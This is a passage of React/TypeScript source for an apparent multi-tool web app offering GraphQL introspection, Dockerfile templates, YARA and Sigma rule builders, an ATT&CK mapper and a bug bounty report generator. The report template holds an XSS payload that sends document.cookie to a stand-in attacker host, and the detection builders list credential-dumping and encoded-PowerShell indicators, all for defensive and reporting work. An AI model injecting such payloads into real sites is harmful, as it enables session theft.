        <input value={url} onChange={(e) => setUrl(e.target.value)} placeholder="https://api.example.com/v1/..." className={inputMonoCls + " flex-1"} />
        <button onClick={send} disabled={busy} className={btnCls}>{busy ? "..." : "Send"}</button>
      </div>
      <div>
        <FieldLabel>Headers (JSON)</FieldLabel>
        <textarea value={headers} onChange={(e) => setHeaders(e.target.value)} rows={3} className={inputMonoCls + " text-[11px] resize-none"} />
      </div>
      {method !== "GET" && method !== "HEAD" && (
        <div>
          <FieldLabel>Body</FieldLabel>
          <textarea value={body} onChange={(e) => setBody(e.target.value)} rows={3} placeholder='{"hello":"world"}' className={inputMonoCls + " text-[11px] resize-none"} />
        </div>
      )}
      {err && <div className="text-[12px] text-primary rounded-xl border border-primary/30 bg-primary/5 p-2">{err}</div>}
      {resp && (
        <div className="rounded-xl border border-border bg-background overflow-hidden">
          <div className="flex items-center justify-between px-3 py-1.5 border-b border-border text-[11px]">
            <span className={`font-bold ${resp.status < 300 ? "text-emerald-400" : resp.status < 500 ? "text-amber-400" : "text-primary"}`}>{resp.status}</span>
            <span className="text-muted-foreground font-mono">{resp.ms}ms</span>
            <CopyButton value={resp.body} label="Copy body" />
          </div>
          <pre className="p-3 text-[11px] font-mono max-h-56 overflow-auto whitespace-pre-wrap break-all">{resp.body || "(empty)"}</pre>
        </div>
      )}
      <div className="rounded-xl bg-[#050505] border border-border overflow-hidden">
        <div className="flex items-center justify-between px-3 py-1.5 border-b border-border text-[11px] uppercase tracking-wider text-muted-foreground">
          <span>cURL equivalent</span><CopyButton value={curl} />
        </div>
        <pre className="p-3 text-[11px] font-mono whitespace-pre-wrap break-all">{curl}</pre>
      </div>
    </div>
  );
}

function GraphqlIntrospection() {
  const [endpoint, setEndpoint] = useState("");
  const [auth, setAuth] = useState("");
  const [out, setOut] = useState("");
  const [busy, setBusy] = useState(false);
  const QUERY = `query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields { name args { name type { name kind } } type { name kind ofType { name kind } } } } } }`;
  const run = async () => {
    if (!endpoint.trim()) return;
    setBusy(true); setOut("");
    try {
      const r = await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...(auth ? { Authorization: auth } : {}) },
        body: JSON.stringify({ query: QUERY }),
      });
      const json = await r.json();
      const types = json?.data?.__schema?.types ?? [];
      const dangerous: string[] = [];
      types.forEach((t: { name: string; fields?: { name: string }[] }) => {
        t.fields?.forEach((f) => {
          if (/admin|internal|debug|delete|drop|exec|raw|password|secret|key|token/i.test(f.name)) {
            dangerous.push(`${t.name}.${f.name}`);
          }
        });
      });
      setOut(`# Schema (${types.length} types)\n\n${types.slice(0, 20).map((t: { name: string; kind: string }) => `${t.kind}  ${t.name}`).join("\n")}\n\n# Dangerous-looking fields\n${dangerous.length ? dangerous.map((d) => "- " + d).join("\n") : "(none flagged)"}`);
    } catch (e) {
      setOut(`Error: ${(e as Error).message}\n\nTry the curl below in your terminal:\n\ncurl -X POST '${endpoint}' \\\n  -H 'content-type: application/json' \\\n  ${auth ? `-H 'authorization: ${auth}' \\\n  ` : ""}-d '${JSON.stringify({ query: QUERY })}'`);
    } finally { setBusy(false); }
  };
  return (
    <div className="space-y-3">
      <input value={endpoint} onChange={(e) => setEndpoint(e.target.value)} placeholder="https://api.example.com/graphql" className={inputMonoCls} />
      <input value={auth} onChange={(e) => setAuth(e.target.value)} placeholder="Authorization header (optional)" className={inputMonoCls} />
      <button onClick={run} disabled={busy} className={btnCls + " w-full"}>{busy ? "Querying..." : "Introspect"}</button>
      {out && (
        <div>
          <div className="flex items-center justify-between mb-1.5">
            <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">Result</span>
            <CopyButton value={out} />
          </div>
          <pre className="bg-background border border-border rounded-xl p-3 text-[11px] font-mono max-h-72 overflow-auto whitespace-pre-wrap">{out}</pre>
        </div>
      )}
    </div>
  );
}

function DockerfileGen() {
  const STACKS: Record<string, { name: string; df: string }> = {
    "node": { name: "Node.js (multi-stage)", df: `FROM node:22-alpine AS deps\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --omit=dev\n\nFROM node:22-alpine AS build\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build\n\nFROM node:22-alpine\nWORKDIR /app\nENV NODE_ENV=production\nCOPY --from=deps /app/node_modules ./node_modules\nCOPY --from=build /app/dist ./dist\nUSER node\nEXPOSE 3000\nCMD ["node", "dist/index.js"]` },
    "python": { name: "Python (FastAPI/uv)", df: `FROM python:3.13-slim AS base\nENV PYTHONDONTWRITEBYTECODE=1 PYTHONUNBUFFERED=1\nWORKDIR /app\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n\nCOPY . .\nRUN useradd -m app && chown -R app /app\nUSER app\nEXPOSE 8000\nCMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"]` },
    "go": { name: "Go (scratch)", df: `FROM golang:1.23-alpine AS build\nWORKDIR /src\nCOPY go.* ./\nRUN go mod download\nCOPY . .\nRUN CGO_ENABLED=0 GOOS=linux go build -ldflags="-s -w" -o /app/server ./cmd/server\n\nFROM scratch\nCOPY --from=build /app/server /server\nCOPY --from=build /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/\nEXPOSE 8080\nENTRYPOINT ["/server"]` },
    "rust": { name: "Rust (cargo-chef cache)", df: `FROM rust:1.83-slim AS chef\nRUN cargo install cargo-chef\nWORKDIR /app\n\nFROM chef AS planner\nCOPY . .\nRUN cargo chef prepare --recipe-path recipe.json\n\nFROM chef AS builder\nCOPY --from=planner /app/recipe.json recipe.json\nRUN cargo chef cook --release --recipe-path recipe.json\nCOPY . .\nRUN cargo build --release --bin app\n\nFROM debian:bookworm-slim\nWORKDIR /app\nCOPY --from=builder /app/target/release/app /usr/local/bin/app\nEXPOSE 8080\nCMD ["app"]` },
    "java": { name: "Java (Spring + jlink)", df: `FROM eclipse-temurin:21-jdk AS build\nWORKDIR /app\nCOPY . .\nRUN ./mvnw -B -DskipTests package\n\nFROM eclipse-temurin:21-jre-alpine\nWORKDIR /app\nCOPY --from=build /app/target/*.jar app.jar\nEXPOSE 8080\nENTRYPOINT ["java", "-XX:+UseContainerSupport", "-jar", "app.jar"]` },
    "php": { name: "PHP (FPM + nginx)", df: `FROM php:8.3-fpm-alpine\nRUN docker-php-ext-install pdo pdo_mysql opcache\nWORKDIR /var/www/html\nCOPY --chown=www-data:www-data . .\nRUN apk add --no-cache nginx && \\\n    mkdir -p /run/nginx\nEXPOSE 80\nCMD ["sh","-c","php-fpm -D && nginx -g 'daemon off;'"]` },
    "ruby": { name: "Ruby on Rails", df: `FROM ruby:3.3-slim AS base\nRUN apt-get update -qq && apt-get install -y build-essential libpq-dev nodejs\nWORKDIR /rails\nCOPY Gemfile* .\nRUN bundle install --without development test\nCOPY . .\nENV RAILS_ENV=production RAILS_LOG_TO_STDOUT=1\nEXPOSE 3000\nCMD ["rails","server","-b","0.0.0.0"]` },
    "static": { name: "Static site (nginx)", df: `FROM node:22-alpine AS build\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build\n\nFROM nginx:1.27-alpine\nCOPY --from=build /app/dist /usr/share/nginx/html\nCOPY nginx.conf /etc/nginx/conf.d/default.conf\nEXPOSE 80` },
  };
  const [stack, setStack] = useState<keyof typeof STACKS>("node");
  return (
    <div className="space-y-3">
      <div className="grid grid-cols-2 gap-1.5">
        {(Object.keys(STACKS) as (keyof typeof STACKS)[]).map((k) => (
          <button key={k} onClick={() => setStack(k)} className={`py-1.5 px-2 rounded-lg text-[11px] font-bold border ${stack === k ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>{STACKS[k].name}</button>
        ))}
      </div>
      <div className="rounded-xl bg-[#050505] border border-border overflow-hidden">
        <div className="flex items-center justify-between px-3 py-1.5 border-b border-border text-[11px] uppercase tracking-wider text-muted-foreground">
          <span>Dockerfile</span><CopyButton value={STACKS[stack].df} />
        </div>
        <pre className="p-3 text-[11px] font-mono max-h-80 overflow-auto whitespace-pre">{STACKS[stack].df}</pre>
      </div>
    </div>
  );
}

function YaraBuilder() {
  const [name, setName] = useState("Suspicious_Loader_2026");
  const [author, setAuthor] = useState("CHAT-GPT.ai");
  const [strings, setStrings] = useState("powershell -enc\nInvoke-WebRequest\n0x4D5A");
  const [hashes, setHashes] = useState("");
  const out = useMemo(() => {
    const id = name.replace(/[^a-zA-Z0-9_]/g, "_");
    const lines = strings.split(/\n/).map((s) => s.trim()).filter(Boolean);
    const stringDefs = lines.map((s, i) => {
      if (/^0x[0-9a-fA-F]+$/.test(s)) return `        $hex_${i} = { ${s.slice(2).match(/.{1,2}/g)?.join(" ") ?? s} }`;
      return `        $s_${i} = ${JSON.stringify(s)} ascii wide`;
    }).join("\n");
    const hashList = hashes.split(/\n/).map((h) => h.trim()).filter(Boolean);
    const condBase = lines.length === 0 ? "false" : `${lines.length >= 3 ? "3" : lines.length} of ($s_*, $hex_*)`;
    const hashCond = hashList.length ? `\n    and (${hashList.map((h) => `hash.sha256(0, filesize) == "${h.toLowerCase()}"`).join(" or ")})` : "";
    return `import "hash"\n\nrule ${id}\n{\n    meta:\n        author = "${author}"\n        date = "${new Date().toISOString().slice(0, 10)}"\n        description = "Auto-generated rule for ${id}"\n        tlp = "amber"\n\n    strings:\n${stringDefs || "        $marker = \"REPLACE_ME\""}\n\n    condition:\n        ${condBase}${hashCond}\n}`;
  }, [name, author, strings, hashes]);
  return (
    <div className="space-y-3">
      <div className="grid grid-cols-2 gap-2">
        <div><FieldLabel>Rule name</FieldLabel><input value={name} onChange={(e) => setName(e.target.value)} className={inputMonoCls} /></div>
        <div><FieldLabel>Author</FieldLabel><input value={author} onChange={(e) => setAuthor(e.target.value)} className={inputCls} /></div>
      </div>
      <div><FieldLabel>Strings / hex (one per line, 0x… for hex)</FieldLabel><textarea value={strings} onChange={(e) => setStrings(e.target.value)} rows={4} className={inputMonoCls + " text-[11px] resize-none"} /></div>
      <div><FieldLabel>SHA-256 hashes (optional, one per line)</FieldLabel><textarea value={hashes} onChange={(e) => setHashes(e.target.value)} rows={2} className={inputMonoCls + " text-[10px] resize-none"} /></div>
      <div className="rounded-xl bg-[#050505] border border-border overflow-hidden">
        <div className="flex items-center justify-between px-3 py-1.5 border-b border-border text-[11px] uppercase tracking-wider text-muted-foreground">
          <span>{name}.yar</span><CopyButton value={out} />
        </div>
        <pre className="p-3 text-[11px] font-mono max-h-64 overflow-auto whitespace-pre">{out}</pre>
      </div>
    </div>
  );
}

function SigmaBuilder() {
  const [title, setTitle] = useState("Suspicious PowerShell Encoded Command");
  const [logsource, setLogsource] = useState<"windows" | "linux" | "aws" | "okta">("windows");
  const [desc, setDesc] = useState("Detects encoded PowerShell payloads typically used by initial access loaders.");
  const [keywords, setKeywords] = useState("powershell\n-enc\n-EncodedCommand\nFromBase64String");
  const [level, setLevel] = useState<"low" | "medium" | "high" | "critical">("high");
  const out = useMemo(() => {
    const id = `00000000-0000-4000-8000-${Math.abs(hash32(title)).toString(16).padStart(12, "0").slice(-12)}`;
    const kw = keywords.split(/\n/).map((s) => s.trim()).filter(Boolean);
    const ls = logsource === "windows" ? "    product: windows\n    category: process_creation"
      : logsource === "linux" ? "    product: linux\n    category: process_creation"
      : logsource === "aws" ? "    product: aws\n    service: cloudtrail" : "    product: okta\n    service: okta";
    const det = logsource === "windows" || logsource === "linux"
      ? `    selection:\n        CommandLine|contains:\n${kw.map((k) => `            - ${JSON.stringify(k)}`).join("\n")}\n    condition: selection`
      : `    selection:\n        eventName|contains:\n${kw.map((k) => `            - ${JSON.stringify(k)}`).join("\n")}\n    condition: selection`;
    return `title: ${title}\nid: ${id}\nstatus: experimental\ndescription: ${desc}\nauthor: CHAT-GPT.ai\ndate: ${new Date().toISOString().slice(0, 10)}\nreferences:\n    - https://attack.mitre.org/\nlogsource:\n${ls}\ndetection:\n${det}\nfields:\n    - CommandLine\n    - User\n    - Image\nfalsepositives:\n    - Legitimate administrative scripts\nlevel: ${level}\ntags:\n    - attack.execution\n    - attack.t1059`;
  }, [title, logsource, desc, keywords, level]);
  return (
    <div className="space-y-3">
      <div><FieldLabel>Title</FieldLabel><input value={title} onChange={(e) => setTitle(e.target.value)} className={inputCls} /></div>
      <div><FieldLabel>Description</FieldLabel><textarea value={desc} onChange={(e) => setDesc(e.target.value)} rows={2} className={inputCls + " resize-none"} /></div>
      <div className="grid grid-cols-2 gap-2">
        <div>
          <FieldLabel>Log source</FieldLabel>
          <select value={logsource} onChange={(e) => setLogsource(e.target.value as typeof logsource)} className={inputCls}>
            <option value="windows">Windows process</option><option value="linux">Linux process</option>
            <option value="aws">AWS CloudTrail</option><option value="okta">Okta</option>
          </select>
        </div>
        <div>
          <FieldLabel>Severity</FieldLabel>
          <select value={level} onChange={(e) => setLevel(e.target.value as typeof level)} className={inputCls}>
            <option>low</option><option>medium</option><option>high</option><option>critical</option>
          </select>
        </div>
      </div>
      <div><FieldLabel>Keywords / indicators</FieldLabel><textarea value={keywords} onChange={(e) => setKeywords(e.target.value)} rows={3} className={inputMonoCls + " text-[11px] resize-none"} /></div>
      <div className="rounded-xl bg-[#050505] border border-border overflow-hidden">
        <div className="flex items-center justify-between px-3 py-1.5 border-b border-border text-[11px] uppercase tracking-wider text-muted-foreground">
          <span>sigma.yml</span><CopyButton value={out} />
        </div>
        <pre className="p-3 text-[11px] font-mono max-h-64 overflow-auto whitespace-pre">{out}</pre>
      </div>
    </div>
  );
}

function MitreMapper() {
  const TTPS = [
    { id: "T1566", name: "Phishing", tactic: "Initial Access", kw: ["phish", "email", "attachment", "link", "lure"] },
    { id: "T1190", name: "Exploit Public-Facing Application", tactic: "Initial Access", kw: ["sqli", "rce", "exploit", "log4j", "jenkins", "exposed"] },
    { id: "T1078", name: "Valid Accounts", tactic: "Initial Access", kw: ["password spray", "valid account", "stolen credential", "leaked"] },
    { id: "T1059", name: "Command and Scripting Interpreter", tactic: "Execution", kw: ["powershell", "bash", "cmd", "wmic", "vbs", "script"] },
    { id: "T1053", name: "Scheduled Task/Job", tactic: "Persistence", kw: ["schtasks", "cron", "scheduled task"] },
    { id: "T1547", name: "Boot/Logon Autostart", tactic: "Persistence", kw: ["startup", "registry run", "autostart"] },
    { id: "T1055", name: "Process Injection", tactic: "Defense Evasion", kw: ["injection", "dll", "hollow", "shellcode"] },
    { id: "T1027", name: "Obfuscated Files / Information", tactic: "Defense Evasion", kw: ["obfuscat", "base64", "xor", "encoded"] },
    { id: "T1003", name: "OS Credential Dumping", tactic: "Credential Access", kw: ["mimikatz", "lsass", "ntds", "sam dump"] },
    { id: "T1110", name: "Brute Force", tactic: "Credential Access", kw: ["brute", "password guess", "hydra"] },
    { id: "T1083", name: "File and Directory Discovery", tactic: "Discovery", kw: ["dir /s", "ls -la", "find ", "enumerat"] },
    { id: "T1082", name: "System Information Discovery", tactic: "Discovery", kw: ["systeminfo", "uname", "whoami /all"] },
    { id: "T1021", name: "Remote Services", tactic: "Lateral Movement", kw: ["rdp", "smb", "psexec", "ssh"] },
    { id: "T1041", name: "Exfiltration Over C2", tactic: "Exfiltration", kw: ["exfil", "upload", "exfiltrat"] },
    { id: "T1486", name: "Data Encrypted for Impact", tactic: "Impact", kw: ["ransom", "encrypt files", "lockbit", "wannacry"] },
    { id: "T1499", name: "Endpoint Denial of Service", tactic: "Impact", kw: ["ddos", "denial of service", "flood"] },
    { id: "T1071", name: "Application Layer Protocol", tactic: "C2", kw: ["c2", "command and control", "beacon"] },
  ];
  const [text, setText] = useState("Attacker sent a phishing email with a malicious attachment. Once opened, PowerShell decoded a base64 payload and dumped LSASS to extract credentials, then moved laterally over SMB.");
  const matches = useMemo(() => {
    const t = text.toLowerCase();
    const out: { id: string; name: string; tactic: string; hit: string }[] = [];
    TTPS.forEach((tt) => {
      const hit = tt.kw.find((k) => t.includes(k));
      if (hit) out.push({ id: tt.id, name: tt.name, tactic: tt.tactic, hit });
    });
    return out;
  }, [text]);
  return (
    <div className="space-y-3">
      <textarea value={text} onChange={(e) => setText(e.target.value)} rows={5} placeholder="Describe the incident or attack chain..." className={inputCls + " resize-none"} />
      <div className="space-y-1.5 max-h-72 overflow-y-auto">
        {matches.length === 0 ? (
          <div className="text-[12px] text-muted-foreground italic">No ATT&CK techniques matched. Try richer wording (e.g. phishing, lateral movement, mimikatz).</div>
        ) : matches.map((m) => (
          <div key={m.id} className="rounded-lg border border-border bg-background p-2">
            <div className="flex items-center justify-between">
              <a href={`https://attack.mitre.org/techniques/${m.id}/`} target="_blank" rel="noreferrer" className="text-blue-400 font-mono font-bold text-[12px] hover:underline">{m.id}</a>
              <span className="text-[10px] font-bold uppercase px-2 py-0.5 rounded bg-primary/15 text-primary">{m.tactic}</span>
            </div>
            <div className="text-[12.5px] font-semibold mt-0.5">{m.name}</div>
            <div className="text-[10px] text-muted-foreground mt-0.5">matched: <span className="font-mono">{m.hit}</span></div>
          </div>
        ))}
      </div>
    </div>
  );
}

function BugBountyReport() {
  const [title, setTitle] = useState("Stored XSS in profile bio");
  const [target, setTarget] = useState("https://app.example.com");
  const [severity, setSeverity] = useState<"Critical" | "High" | "Medium" | "Low">("High");
  const [summary, setSummary] = useState("The bio field is rendered without escaping, allowing arbitrary HTML/JS to execute in any visitor's session.");
  const [steps, setSteps] = useState("1. Log in and visit /profile/edit\n2. In Bio paste: <img src=x onerror=alert(document.cookie)>\n3. Save, then visit your public profile from any other account.");
  const out = useMemo(() => {
    const cvss = severity === "Critical" ? 9.6 : severity === "High" ? 8.1 : severity === "Medium" ? 5.4 : 3.1;
    return `# ${title}\n\n**Target:** ${target}\n**Severity:** ${severity} (CVSS ${cvss})\n**Reporter:** CHAT-GPT.ai operator\n**Date:** ${new Date().toISOString().slice(0, 10)}\n\n## Summary\n${summary}\n\n## Steps to reproduce\n${steps}\n\n## Impact\nA malicious actor can execute arbitrary JavaScript in the context of any user that views the affected profile, leading to:\n- Session hijacking via cookie theft\n- Forced privileged actions on behalf of the victim\n- Defacement and credential phishing within the trusted origin\n\n## Proof of concept\n\`\`\`html\n<img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)">\n\`\`\`\n\n## Suggested fix\n- Escape all user-provided HTML before rendering (use a battle-tested library such as DOMPurify on the server).\n- Add a strict \`Content-Security-Policy\` that disallows inline scripts.\n- Mark session cookies as \`HttpOnly\`, \`Secure\` and \`SameSite=Strict\`.\n\n## References\n- OWASP — Cross-Site Scripting (XSS)\n- CWE-79 — Improper Neutralization of Input During Web Page Generation\n- HackerOne disclosure guidelines\n\n_All testing was performed within the program scope and on accounts I control._`;
  }, [title, target, severity, summary, steps]);
  return (
    <div className="space-y-3">
      <div className="grid grid-cols-2 gap-2">
        <div><FieldLabel>Title</FieldLabel><input value={title} onChange={(e) => setTitle(e.target.value)} className={inputCls} /></div>
        <div>
          <FieldLabel>Severity</FieldLabel>
          <select value={severity} onChange={(e) => setSeverity(e.target.value as typeof severity)} className={inputCls}>
            <option>Critical</option><option>High</option><option>Medium</option><option>Low</option>
          </select>
        </div>
      </div>
      <div><FieldLabel>Target URL</FieldLabel><input value={target} onChange={(e) => setTarget(e.target.value)} className={inputMonoCls} /></div>
      <div><FieldLabel>One-line summary</FieldLabel><textarea value={summary} onChange={(e) => setSummary(e.target.value)} rows={2} className={inputCls + " resize-none"} /></div>
      <div><FieldLabel>Steps to reproduce</FieldLabel><textarea value={steps} onChange={(e) => setSteps(e.target.value)} rows={4} className={inputMonoCls + " text-[11px] resize-none"} /></div>
      <div>
        <div className="flex items-center justify-between mb-1.5">
          <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">Markdown report</span>
          <CopyButton value={out} />
        </div>
        <pre className="bg-background border border-border rounded-xl p-3 text-[11.5px] whitespace-pre-wrap max-h-72 overflow-y-auto leading-relaxed">{out}</pre>
      </div>
    </div>
  );
}

function ContractAuditor() {
  const [code, setCode] = useState(`pragma solidity ^0.8.0;\n\ncontract Bank {\n    mapping(address => uint) public balance;\n    function withdraw(uint amount) public {\n        require(balance[msg.sender] >= amount);\n        (bool ok, ) = msg.sender.call{value: amount}("");\n        require(ok);\n        balance[msg.sender] -= amount;\n    }\n    function admin() public {\n        require(tx.origin == owner);\n    }\n}`);
  const findings = useMemo(() => {
    const out: { sev: string; title: string; line: number; note: string }[] = [];
    const lines = code.split(/\n/);
    lines.forEach((l, i) => {
      const ln = i + 1;
      if (/\.call\{value:/.test(l) && code.indexOf(l) < code.search(/-=|=\s*0/)) {
        out.push({ sev: "Critical", title: "Reentrancy — state updated after external call", line: ln, note: "Apply checks-effects-interactions; or use ReentrancyGuard." });
      }
      if (/tx\.origin/.test(l)) out.push({ sev: "High", title: "tx.origin used for authorization", line: ln, note: "Use msg.sender — tx.origin is phishable through contract calls." });
      if (/block\.timestamp|now\b/.test(l)) out.push({ sev: "Medium", title: "Timestamp dependence", line: ln, note: "Miners can manipulate timestamps within ~15 seconds." });
      if (/pragma solidity\s+\^?0\.[0-7]\./.test(l)) out.push({ sev: "High", title: "Outdated Solidity version", line: ln, note: "Use ≥ 0.8.20 for built-in overflow checks and current optimizer." });
      if (/selfdestruct\s*\(/.test(l)) out.push({ sev: "High", title: "selfdestruct present", line: ln, note: "Deprecated since EIP-6049; can wipe contract & funds unexpectedly." });
      if (/delegatecall\s*\(/.test(l)) out.push({ sev: "Critical", title: "delegatecall to user-controlled address", line: ln, note: "Verify the target is trusted and immutable." });
      if (/(public|external)\s+view\s+returns\s*\(uint(8|16|32|64|128)?\)/.test(l)) {
        // benign
      }
      if (/transfer\s*\(\s*msg\.sender\s*,\s*\)/.test(l) || /\.transfer\s*\(/.test(l)) {
        out.push({ sev: "Low", title: ".transfer / .send forwards only 2300 gas", line: ln, note: "Prefer .call{value: x}('') with explicit checks." });
      }
    });
    if (!/SafeMath|^0\.8\./.test(code) && /pragma solidity\s+\^?0\.[0-7]\./.test(code)) {
      out.push({ sev: "High", title: "Possible integer overflow", line: 1, note: "Use SafeMath or upgrade to Solidity 0.8+." });
    }
    return out;
  }, [code]);
  const sevColor: Record<string, string> = {
    Critical: "bg-primary/15 text-primary border-primary/30",
    High: "bg-amber-500/15 text-amber-400 border-amber-500/30",
    Medium: "bg-yellow-500/15 text-yellow-400 border-yellow-500/30",
    Low: "bg-blue-500/15 text-blue-400 border-blue-500/30",
  };
  return (
    <div className="space-y-3">
      <textarea value={code} onChange={(e) => setCode(e.target.value)} rows={8} placeholder="Paste Solidity source..." className={inputMonoCls + " text-[11px] resize-none"} />
      <div className="space-y-1.5 max-h-72 overflow-y-auto">
        {findings.length === 0 ? (
          <div className="text-[12px] text-emerald-400 italic">No common vulnerabilities detected. Manual review still recommended.</div>
        ) : findings.map((f, i) => (
          <div key={i} className="rounded-lg border border-border bg-background p-2">
            <div className="flex items-center justify-between mb-0.5">
              <span className="font-semibold text-[12.5px]">{f.title}</span>
              <span className={`text-[10px] font-bold uppercase px-2 py-0.5 rounded border ${sevColor[f.sev]}`}>{f.sev}</span>
            </div>
            <div className="text-[11px] text-muted-foreground">line {f.line} · {f.note}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

function GitCommitGen() {
  const [type, setType] = useState<"feat" | "fix" | "refactor" | "perf" | "docs" | "style" | "test" | "build" | "chore" | "ci">("feat");
  const [scope, setScope] = useState("auth");
  const [summary, setSummary] = useState("add JWT refresh-token rotation");
  const [body, setBody] = useState("Rotate the refresh token on every successful refresh and invalidate the previous one server-side. Reduces window for replay attacks if a token is leaked.");
  const [breaking, setBreaking] = useState(false);
  const out = useMemo(() => {
    const head = `${type}${scope ? `(${scope})` : ""}${breaking ? "!" : ""}: ${summary.replace(/^./, (c) => c.toLowerCase())}`;
    const lines = [head.slice(0, 72)];
    if (body.trim()) lines.push("", body.trim());
    if (breaking) lines.push("", "BREAKING CHANGE: clients must obtain a new refresh token after upgrade.");
    return lines.join("\n");
  }, [type, scope, summary, body, breaking]);
  return (
    <div className="space-y-3">
      <div className="grid grid-cols-3 gap-2">
        <div>
          <FieldLabel>Type</FieldLabel>
          <select value={type} onChange={(e) => setType(e.target.value as typeof type)} className={inputCls}>
            {(["feat", "fix", "refactor", "perf", "docs", "style", "test", "build", "chore", "ci"] as const).map((t) => <option key={t}>{t}</option>)}
          </select>
        </div>
        <div className="col-span-2"><FieldLabel>Scope</FieldLabel><input value={scope} onChange={(e) => setScope(e.target.value)} placeholder="optional" className={inputMonoCls} /></div>
      </div>
      <div><FieldLabel>Summary</FieldLabel><input value={summary} onChange={(e) => setSummary(e.target.value)} className={inputCls} /></div>
      <div><FieldLabel>Body</FieldLabel><textarea value={body} onChange={(e) => setBody(e.target.value)} rows={3} className={inputCls + " resize-none"} /></div>
      <label className="flex items-center justify-between bg-background border border-border rounded-lg px-3 py-2 text-sm">
        <span>Breaking change</span><Switch checked={breaking} onCheckedChange={setBreaking} />
      </label>
      <div className="rounded-xl bg-[#050505] border border-border overflow-hidden">
        <div className="flex items-center justify-between px-3 py-1.5 border-b border-border text-[11px] uppercase tracking-wider text-muted-foreground">
          <span>commit message</span><CopyButton value={out} />
        </div>
        <pre className="p-3 text-[12px] font-mono whitespace-pre-wrap">{out}</pre>
      </div>
    </div>
  );
}

function PaletteGen() {
  const [hex, setHex] = useState("#e21227");
  const palette = useMemo(() => {
    const h = hex.replace("#", "");
    if (!/^[0-9a-f]{6}$/i.test(h)) return null;
    const r = parseInt(h.slice(0, 2), 16) / 255, g = parseInt(h.slice(2, 4), 16) / 255, b = parseInt(h.slice(4, 6), 16) / 255;
    const max = Math.max(r, g, b), min = Math.min(r, g, b);
    let H = 0; const L = (max + min) / 2; const d = max - min;
    const S = d === 0 ? 0 : d / (1 - Math.abs(2 * L - 1));
    if (d) {
      if (max === r) H = ((g - b) / d) % 6;
      else if (max === g) H = (b - r) / d + 2;
      else H = (r - g) / d + 4;
      H *= 60; if (H < 0) H += 360;
    }
    const hslToHex = (h2: number, s2: number, l2: number) => {
      const c = (1 - Math.abs(2 * l2 - 1)) * s2;
      const x = c * (1 - Math.abs(((h2 / 60) % 2) - 1));
      const m = l2 - c / 2;
      const [r2, g2, b2] = h2 < 60 ? [c, x, 0] : h2 < 120 ? [x, c, 0] : h2 < 180 ? [0, c, x] : h2 < 240 ? [0, x, c] : h2 < 300 ? [x, 0, c] : [c, 0, x];
      return "#" + [r2, g2, b2].map((v) => Math.round((v + m) * 255).toString(16).padStart(2, "0")).join("");
    };
    const swatches = [
      { name: "50",  hex: hslToHex(H, Math.min(S, 0.4), 0.96) },
      { name: "200", hex: hslToHex(H, S, 0.82) },
      { name: "500", hex: hslToHex(H, S, 0.5) },
      { name: "700", hex: hslToHex(H, S, 0.36) },
      { name: "900", hex: hslToHex(H, S, 0.18) },
      { name: "comp", hex: hslToHex((H + 180) % 360, S, 0.5) },
      { name: "tri-1", hex: hslToHex((H + 120) % 360, S, 0.5) },
      { name: "tri-2", hex: hslToHex((H + 240) % 360, S, 0.5) },
    ];
    return { swatches, hue: Math.round(H), sat: Math.round(S * 100), light: Math.round(L * 100) };
  }, [hex]);
  return (
    <div className="space-y-3">
      <div className="flex items-center gap-2">
        <input type="color" value={hex} onChange={(e) => setHex(e.target.value)} className="w-12 h-10 rounded-lg bg-background border border-border" />
        <input value={hex} onChange={(e) => setHex(e.target.value)} className={inputMonoCls + " flex-1"} />
      </div>
      {palette && (
        <>
          <div className="text-[11px] text-muted-foreground font-mono text-center">H {palette.hue}° · S {palette.sat}% · L {palette.light}%</div>
          <div className="grid grid-cols-4 gap-2">
            {palette.swatches.map((s) => (
              <button key={s.name} onClick={() => navigator.clipboard.writeText(s.hex)} className="rounded-xl overflow-hidden border border-border hover:scale-105 transition-transform">
                <div style={{ background: s.hex }} className="h-14" />
                <div className="bg-background px-2 py-1 text-center">
                  <div className="text-[10px] font-bold uppercase text-muted-foreground">{s.name}</div>
                  <div className="font-mono text-[10px]">{s.hex.toUpperCase()}</div>
                </div>
              </button>
            ))}
          </div>
          <CopyButton value={palette.swatches.map((s) => `${s.name}: ${s.hex}`).join("\n")} label="Copy as list" />
        </>
      )}
    </div>
  );
}

function LyricsComposer() {
  const [topic, setTopic] = useState("a hacker who falls in love with the night");
  const [genre, setGenre] = useState<"pop" | "rap" | "rock" | "lofi" | "country" | "arabic">("pop");
  const [out, setOut] = useState("");
  const generate = () => {
    const seed = Math.abs(hash32(topic + genre + Date.now()));
    const pick = <T,>(a: T[]) => a[seed % a.length];
    const verse1 = {
      pop: [`I see your screen in the rain tonight`, `every line of code feels like a fight`, `and the world keeps spinning, but I hold on tight`, `to ${topic}`],
      rap: [`Yeah — keys click, terminal lit`, `I'm coding in the dark, every bug I commit`, `they sleep, I grind, and I never quit`, `it's all about ${topic}`],
      rock: [`The city's on fire, but the screen stays cold`, `I am writing the story that won't be told`, `breaking every chain that the system holds`, `this is ${topic}`],
      lofi: [`soft hum of the fan, half a coffee left`, `cursor blinking slow like a quiet breath`, `nothing's broken yet, nothing's left`, `just ${topic}`],
      country: [`Down the dirt road where the wifi's slow`, `I write a little song nobody knows`, `about ${topic}, where the wild wind blows`, ``],
      arabic: [`في الليل أنا ساهر مع الكود`, `قلبي يطير على إيقاع البرود`, `أكتب أحلامي بلغة الأرقام`, `${topic}`],
    }[genre];
    const chorus = {
      pop: [`Oh-oh, every byte feels like a heartbeat`, `Oh-oh, every echo on the dark street`, `we are running, we are free`, ``],
      rap: [`This is mine, this is real, this is now`, `every line of attack, gotta show 'em how`, `bow down, bow down, bow down`, ``],
      rock: [`Burn it all, burn it down`, `we are kings of the underground sound`, `nothing gonna hold us now`, ``],
